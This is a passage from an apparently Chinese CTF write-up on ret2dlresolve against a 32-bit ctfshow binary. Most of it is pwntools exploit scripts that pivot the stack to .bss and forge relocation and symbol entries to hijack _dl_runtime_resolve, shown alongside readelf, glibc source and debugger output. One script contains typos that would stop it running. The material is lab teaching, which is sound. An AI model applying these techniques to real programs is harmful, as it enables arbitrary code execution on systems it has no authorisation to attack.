class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stag = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*0ffset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bin_sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">rop.write(<span class="number">1</span>,base_stage+<span class="number">80</span>,<span class="built_in">len</span>(bin_sh))</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(bin_sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>程序正常输出了<code>/bin/sh\x00</code></p><h4 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h4><p>在这一阶段，进一步利用_dl_runtime_resolve相关知识来控制程序执行write函数</p><ol><li>将栈迁移到 bss 段。</li><li>控制程序直接执行 plt[0] 中的相关指令，即 push linkmap 以及跳转到 <code>_dl_runtime_resolve</code> 函数。这时，我们还需要提供 write 重定位项在 got 表中的偏移。这里，我们可以直接使用 write plt 中提供的偏移，即 0x080483C6 处所给出的 0x20。其实，我们也可以跳转到 0x080483C6 地址处，利用原有的指令来提供 write 函数的偏移，并跳转到 plt[0]。</li></ol><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_21-54-57.png" alt="1"></p><p>具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">jmprel_data = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).data()</span><br><span class="line">writegot = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_reloc_offset = jmprel_data.find(p32(writegot,endian=<span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(write_reloc_offset) <span class="comment">#0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_reloc_offset))</span><br><span class="line"><span class="comment">#前两个也可以换为rop.raw(loc_80483A6_addrs)</span></span><br><span class="line">rop.raw(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage+<span class="number">80</span>)</span><br><span class="line">sh = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">100</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line"></span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.plt:080483C6 loc_80483C6:</span><br><span class="line">.plt:080483C6                 push    20h ; &#x27; &#x27;</span><br><span class="line">.plt:080483CB                 jmp     sub_8048370</span><br></pre></td></tr></table></figure><p>exp中plt0实际存放的地址对应的汇编是<code>push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</code></p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_22-11-26.png" alt="1"></p><p>此时凑齐<code>_dl_runtime_resolve</code>函数的两个参数也就是</p><p><code>_dl_runtime_resolve（linkmap,reloc_offset）</code></p><p>程序正常输出了<code>/bin/sh\x00</code></p><h4 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h4><p>这一次，我们同样控制 <code>_dl_runtime_resolve</code> 函数中的 reloc_offset 参数，不过这次控制其指向我们伪造的 write 重定位项，也就是控制<code>index_offset</code>，使其指向我们构造的<code>fake_reloc</code></p><p>鉴于 pwntools 本身并不支持对重定位表项的信息的获取。这里我们手动看一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">桌面$ readelf -r pwn</span><br><span class="line"></span><br><span class="line">重定位节 <span class="string">&#x27;.rel.dyn&#x27;</span> at offset 0x30c contains 3 entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">08049ff4  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line">08049ff8  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0</span><br><span class="line">08049ffc  00000806 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0</span><br><span class="line"></span><br><span class="line">重定位节 <span class="string">&#x27;.rel.plt&#x27;</span> at offset 0x324 contains 5 entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   <span class="built_in">read</span>@GLIBC_2.0</span><br><span class="line">0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br><span class="line">0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure><p>可以看出write的重定位表项的<code>reloc_offset  = 0x0804a01c</code> ，<code>reloc_info = 0x00000607</code></p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_09-45-40.png" alt="1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">got0 = elf.get_section_by_name(<span class="string">&#x27;.got&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr <span class="comment">#节头地址</span></span><br><span class="line"><span class="comment"># make base_stage+24 ---&gt; fake reloc</span></span><br><span class="line">write_reloc_offset = base_stage+<span class="number">24</span>-rel_plt </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">r_info = <span class="number">0x607</span></span><br><span class="line"></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(write_reloc_offset)</span><br><span class="line"></span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">sh = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))</span><br><span class="line"></span><br><span class="line">rop.raw(write_got)  <span class="comment">#base_stage+24</span></span><br><span class="line">rop.raw(r_info)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line"></span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h4><p>在stage3中我们控制了重定位表项，但是伪造的重定位表项的内容仍然与write函数原来的重定位表项一致。</p><p>在这个阶段，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的<code>r_info=0x607</code>可以知道，write对应的符号在符号表的下标为 0x607&gt;&gt;8&#x3D;0x6。因此我们知道write对应的符号地址为0x0804822c。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">桌面$ readelf -x .dynsym pwn                  </span><br><span class="line"></span><br><span class="line">“.dynsym”节的十六进制输出：</span><br><span class="line">  0x080481cc 00000000 00000000 00000000 00000000 ................</span><br><span class="line">  0x080481dc 33000000 00000000 00000000 12000000 3...............</span><br><span class="line">  0x080481ec 27000000 00000000 00000000 12000000 <span class="string">&#x27;...............</span></span><br><span class="line"><span class="string">  0x080481fc 5c000000 00000000 00000000 20000000 \........... ...</span></span><br><span class="line"><span class="string">  0x0804820c 20000000 00000000 00000000 12000000  ...............</span></span><br><span class="line"><span class="string">  0x0804821c 3a000000 00000000 00000000 12000000 :...............</span></span><br><span class="line"><span class="string">  0x0804822c 4c000000 00000000 00000000 12000000 L...............</span></span><br><span class="line"><span class="string">  0x0804823c 1a000000 00000000 00000000 11000000 ................</span></span><br><span class="line"><span class="string">  0x0804824c 2c000000 00000000 00000000 11000000 ,...............</span></span><br><span class="line"><span class="string">  0x0804825c 0b000000 6c860408 04000000 11001000 ....l...........</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr<span class="comment">#0x80483c0</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<span class="comment">#0x08048324</span></span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">index_offset = (base_stage+<span class="number">24</span>) - rel_plt <span class="comment">#base_stage + 24指向fake_reloc</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line"><span class="built_in">print</span>(align)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align<span class="comment">#这里是为了对齐，因为dynsym里的Elf32_Sym结构体都是0x10字节大小的</span></span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment">#得到write的dynsym索引号</span></span><br><span class="line">r_info = (<span class="built_in">int</span>(index_dynsym) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#r_info的低8位要是7保证通过检查R_386_JUMP_SLOT=7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(r_info))</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">str_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = p32(str_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) +p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))</span><br><span class="line">rop.raw(fake_reloc)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*align)</span><br><span class="line">rop.raw(fake_sym)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>执行之后发现程序断在了fixup函数里，也就是在<code>ld-linux.so.2</code>中崩了</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-28_20-50-10.png" alt="1"></p><p>接着跟着wiki分析</p><p>通过逆向分析ld-linux.so.2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v9 )</span><br><span class="line">&#123;</span><br><span class="line">  v10 = (<span class="type">char</span> *)a1[<span class="number">92</span>] + <span class="number">16</span> * (*(_WORD *)(*((_DWORD *)v9 + <span class="number">1</span>) + <span class="number">2</span> * v4) &amp; <span class="number">0x7FFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_DWORD *)v10 + <span class="number">1</span>) )</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及源码可以知道程序是在访问 version 的 hash 时出错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">        (<span class="type">const</span> <span class="type">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进一步分析可以知道，因为我们伪造了 write 函数的重定位表项，其中 reloc-&gt;r_info（符号表索引+重定位类型） 被设置成了比较大的值（0x26807）（正常值是0x607）。这时候，ndx 的值并不可预期，进而 version 的值也不可预期，因此可能出现不可预期的情况。</p><p>通过分析 .dynmic 节，我们可以发现 vernum(VERSYM) 的地址为 0x80482d8。</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-28_21-26-06.png" alt="1"></p><p>在 ida 中，我们也可以看到相关的信息</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-28_21-34-24.png" alt="1"></p><blockquote><p>这一部分ndx的地址还没搞懂是怎么找的，先把wiki贴上</p><p>那我们可以再次运行看一下伪造后 ndx 具体的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">❯ python stage4.py</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./main_partial_relro_32&#x27;</span>: pid 27649</span><br><span class="line">[*] Loaded 10 cached gadgets <span class="keyword">for</span> <span class="string">&#x27;./main_partial_relro_32&#x27;</span></span><br><span class="line">ndx_addr: 0x80487a8</span><br></pre></td></tr></table></figure><p>可以发现，ndx_落入了 <code>.eh_frame</code> 节中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eh_frame:080487A8                 db  2Ch ; ,</span><br></pre></td></tr></table></figure><p>进一步地，ndx 的值为 0x2C。显然不知道会索引到哪里去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">        (<span class="type">const</span> <span class="type">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过动态调试，我们可以发现 l_versions 的起始地址，并且其中一共有 3 个元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *((struct link_map *)0xf7f0d940)</span><br><span class="line">$4 = &#123;</span><br><span class="line">  l_addr = 0, </span><br><span class="line">  l_name = 0xf7f0dc2c &quot;&quot;, </span><br><span class="line">  l_ld = 0x8049f0c, </span><br><span class="line">  